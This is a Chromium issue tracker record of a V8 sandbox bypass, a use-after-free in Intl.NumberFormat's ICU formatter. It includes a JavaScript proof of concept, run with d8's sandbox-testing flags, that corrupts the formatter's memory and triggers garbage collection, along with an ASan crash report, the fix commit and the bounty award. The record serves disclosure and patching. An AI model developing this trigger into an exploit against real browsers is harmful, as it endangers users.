# V8 Sandbox Bypass: Use-After-Free in ICU NumberFormatter

| Field | Value |
|-------|-------|
| **Issue ID** | [472139305](https://issues.chromium.org/issues/472139305) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Internationalization, Blink>JavaScript>Sandbox |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | vs...@gmail.com |
| **Assignee** | ft...@chromium.org |
| **Created** | 2025-12-29 |
| **Bounty** | $5,000.00 |

## Description

#### VULNERABILITY DETAILS

A use-after-free vulnerability exists in V8's `Intl.NumberFormat` implementation. The `JSNumberFormat` object stores an `icu_number_formatter` field pointing to a `Managed<LocalizedNumberFormatter>`. The ICU formatter internally holds a raw C++ pointer to this managed object.

This seems similar to [bug 454734141](https://issues.chromium.org/issues/454734141)

#### VERSION

V8 Git Commit: 4ccc488f7ea37b66ae8756db5515f51c8f6ead63 (Sun Dec 28 21:33:00 2025 -0800)

#### REPRODUCTION CASE

```
d8 --fuzzing --sandbox-fuzzing --expose-gc bug.js

```
```
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const fmt = new Intl.NumberFormat("en-US");
const addr = Sandbox.getAddressOf(fmt);

let fired = false;
const evil = new Proxy({}, {
  get: (t, p) => (p === Symbol.toPrimitive || p === 'valueOf') ? () => {
    if (!fired) { fired = true; mem.setUint32(addr + 16, 0x1, true); gc(); }
    return 42;
  } : undefined
});

fmt.format(evil);

```

**ASan Report**

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7abe00000000,0x7bbe00000000)
External strings cage bounds: [0x7aafc0000000,0x7ab400000000)
=================================================================
==3324658==ERROR: AddressSanitizer: heap-use-after-free on address 0x7d5ff70e1178 at pc 0x5555594dc2cd bp 0x7fffffffd580 sp 0x7fffffffd578
READ of size 4 at 0x7d5ff70e1178 thread T0
    #0 0x5555594dc2cc in __cxx_atomic_load<int> gen/third_party/libc++/src/include/__atomic/support/c11.h:81:10
    #1 0x5555594dc2cc in load gen/third_party/libc++/src/include/__atomic/atomic.h:71:12
    #2 0x5555594dc2cc in umtx_loadAcquire third_party/icu/source/common/umutex.h:76:16
    #3 0x5555594dc2cc in computeCompiled third_party/icu/source/i18n/number_fluent.cpp:699:28
    #4 0x5555594dc2cc in icu_77::number::LocalizedNumberFormatter::formatImpl(icu_77::number::impl::UFormattedNumberData*, UErrorCode&) const third_party/icu/source/i18n/number_fluent.cpp:652:9
    #5 0x5555594dc4cc in icu_77::number::LocalizedNumberFormatter::formatDouble(double, UErrorCode&) const third_party/icu/source/i18n/number_fluent.cpp:601:5
    #6 0x555557b9c187 in v8::internal::(anonymous namespace)::IcuFormatNumber(v8::internal::Isolate*, icu_77::number::LocalizedNumberFormatter const&, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:1577:33
    #7 0x555557b9b0da in v8::internal::IntlMathematicalValue::FormatNumeric(v8::internal::Isolate*, icu_77::number::LocalizedNumberFormatter const&, v8::internal::IntlMathematicalValue const&) src/objects/js-number-format.cc:1606:10
    #8 0x555557ba2ec8 in v8::internal::JSNumberFormat::NumberFormatFunction(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSNumberFormat>, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:2131:7
    #9 0x555556e3b69e in v8::internal::Builtin_Impl_NumberFormatInternalFormatNumber(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:532:37
    #10 0x55555bb30335 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #11 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #13 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #14 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #15 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #16 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #17 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #18 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #19 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #20 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #21 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #22 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18
    #23 0x7ffff7c8b1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #24 0x7ffff7c8b28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #25 0x555556821029 in _start (/work/v8-build-vanilla/v8/out/vanilla/d8+0x12cd029) (BuildId: c952a06373c588c8)

0x7d5ff70e1178 is located 504 bytes inside of 520-byte region [0x7d5ff70e0f80,0x7d5ff70e1188)
freed by thread T0 here:
    #0 0x5555568fd622 in operator delete(void*, unsigned long) (/work/v8-build-vanilla/v8/out/vanilla/d8+0x13a9622) (BuildId: c952a06373c588c8)
    #1 0x555557b14e97 in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:101:7
    #2 0x555557b14e97 in ~shared_ptr gen/third_party/libc++/src/include/__memory/shared_ptr.h:501:17
    #3 0x555557b14e97 in void v8::internal::detail::Destructor<icu_77::number::LocalizedNumberFormatter>(void*) src/objects/managed-inl.h:21:3
    #4 0x555557c4799b in v8::internal::(anonymous namespace)::ManagedObjectFinalizerSecondPass(v8::WeakCallbackInfo<void> const&) src/objects/managed.cc:21:3
    #5 0x55555715a2e2 in Invoke src/handles/global-handles.cc:867:3
    #6 0x55555715a2e2 in v8::internal::GlobalHandles::InvokeSecondPassPhantomCallbacks() src/handles/global-handles.cc:768:18
    #7 0x55555715bd23 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::GCCallbackFlags) src/handles/global-handles.cc:886:5
    #8 0x55555724c488 in operator() src/heap/heap.cc:1780:34
    #9 0x55555724c488 in InvokeExternalCallbacks<(lambda at ../../src/heap/heap.cc:1775:38)> src/heap/heap.cc:1534:3
    #10 0x55555724c488 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck) src/heap/heap.cc:1775:3
    #11 0x55555758b4ef in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) src/extensions/gc-extension.cc:209:17
    #12 0x555557589f8c in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) src/extensions/gc-extension.cc:296:5
    #13 0x55555ba8452a in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
    #14 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #15 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #16 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #17 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #18 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #19 0x555557049097 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) src/execution/execution.cc:532:10
    #20 0x555557bad8dc in T<v8::internal::Object>::MaybeType v8::internal::JSReceiver::ToPrimitive<v8::internal::Handle>(v8::internal::Isolate*, T<v8::internal::JSReceiver>, v8::internal::ToPrimitiveHint) src/objects/js-objects.cc:2166:9
    #21 0x555557b9f0cd in v8::internal::IntlMathematicalValue::From(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:1688:9
    #22 0x555557ba2e87 in v8::internal::JSNumberFormat::NumberFormatFunction(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSNumberFormat>, v8::internal::Handle<v8::internal::Object>) src/objects/js-number-format.cc:2127:30
    #23 0x555556e3b69e in v8::internal::Builtin_Impl_NumberFormatInternalFormatNumber(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:532:37
    #24 0x55555bb30335 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #25 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #26 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #27 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #28 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #29 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #30 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #31 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #32 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #33 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #34 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #35 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #36 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18

previously allocated by thread T0 here:
    #0 0x5555568fca1d in operator new(unsigned long) (/work/v8-build-vanilla/v8/out/vanilla/d8+0x13a8a1d) (BuildId: c952a06373c588c8)
    #1 0x555557b11e36 in __libcpp_allocate<std::__Cr::__shared_ptr_emplace<icu_77::number::LocalizedNumberFormatter, std::__Cr::allocator<icu_77::number::LocalizedNumberFormatter> > > gen/third_party/libc++/src/include/__new/allocate.h:43:28
    #2 0x555557b11e36 in allocate gen/third_party/libc++/src/include/__memory/allocator.h:92:14
    #3 0x555557b11e36 in allocate gen/third_party/libc++/src/include/__memory/allocator_traits.h:259:16
    #4 0x555557b11e36 in __allocation_guard<std::__Cr::allocator<icu_77::number::LocalizedNumberFormatter> > gen/third_party/libc++/src/include/__memory/allocation_guard.h:55:16
    #5 0x555557b11e36 in allocate_shared<icu_77::number::LocalizedNumberFormatter, std::__Cr::allocator<icu_77::number::LocalizedNumberFormatter>, icu_77::number::LocalizedNumberFormatter &, 0> gen/third_party/libc++/src/include/__memory/shared_ptr.h:681:46
    #6 0x555557b11e36 in std::__Cr::shared_ptr<icu_77::number::LocalizedNumberFormatter> std::__Cr::make_shared<icu_77::number::LocalizedNumberFormatter, icu_77::number::LocalizedNumberFormatter&, 0>(icu_77::number::LocalizedNumberFormatter&) gen/third_party/libc++/src/include/__memory/shared_ptr.h:690:10
    #7 0x555557b97a01 in v8::internal::JSNumberFormat::New(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, char const*) src/objects/js-number-format.cc:1472:15
    #8 0x555556e39181 in LegacyFormatConstructor<v8::internal::JSNumberFormat> src/builtins/builtins-intl.cc:267:24
    #9 0x555556e39181 in v8::internal::Builtin_Impl_NumberFormatConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:461:10
    #10 0x55555bb30335 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #11 0x55555ba83029 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #12 0x55555bc365d7 in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #13 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #14 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #15 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #16 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #17 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #18 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #19 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #20 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #21 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #22 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #23 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #24 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18
    #25 0x7ffff7c8b1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #26 0x7ffff7c8b28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #27 0x555556821029 in _start (/work/v8-build-vanilla/v8/out/vanilla/d8+0x12cd029) (BuildId: c952a06373c588c8)

SUMMARY: AddressSanitizer: heap-use-after-free gen/third_party/libc++/src/include/__atomic/support/c11.h:81:10 in __cxx_atomic_load<int>
Shadow bytes around the buggy address:
  0x7d5ff70e0e80: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x7d5ff70e0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff70e0f80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff70e1000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff70e1080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x7d5ff70e1100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]
  0x7d5ff70e1180: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff70e1200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff70e1280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff70e1300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff70e1380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3324658==ABORTING

## V8 sandbox violation detected!

```

## Timeline

### cl...@appspot.gserviceaccount.com (2025-12-29)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5822222987886592.

### sk...@google.com (2025-12-29)

Failed to reproduce, assigning to V8 shepherd and setting provisional severity/priority/FoundIn

### ch...@google.com (2025-12-30)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### om...@chromium.org (2026-01-01)

Sandbox bypass in icu\_77.   

ftang@ can you take a look at this one as well?

### ft...@chromium.org (2026-01-27)

attempted fix in  https://chromium-review.googlesource.com/c/v8/v8/+/7519173

### dx...@google.com (2026-01-30)

Project: v8/v8  

Branch:  main  

Author:  Frank Tang [ftang@chromium.org](mailto:ftang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7519173>

[intl] Fix Sandbox Bypass: Use-After-Free in ICU NumberFormatter

---


Expand for full commit details
```
     
    Bug: 472139305 
    Change-Id: I48e159312a2a56e6ddb6b0d7234a4df37ac62e20 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7519173 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Frank Tang <ftang@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105016}

```

---

Files:

- M `src/objects/intl-objects.cc`
- M `src/objects/js-number-format.cc`
- M `src/objects/js-number-format.h`
- A `test/mjsunit/sandbox/regress/regress-472139305.js`

---

Hash: [bdc8f396b7d81e6521ee395970935edede39349a](https://chromiumdash.appspot.com/commit/bdc8f396b7d81e6521ee395970935edede39349a)  

Date: Thu Jan 29 20:53:09 2026


---

### ft...@chromium.org (2026-02-02)

fixed by https://chromium-review.googlesource.com/c/v8/v8/+/7519173

### sp...@google.com (2026-02-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
V8 Sandbox Bypass


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-12)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/472139305)*
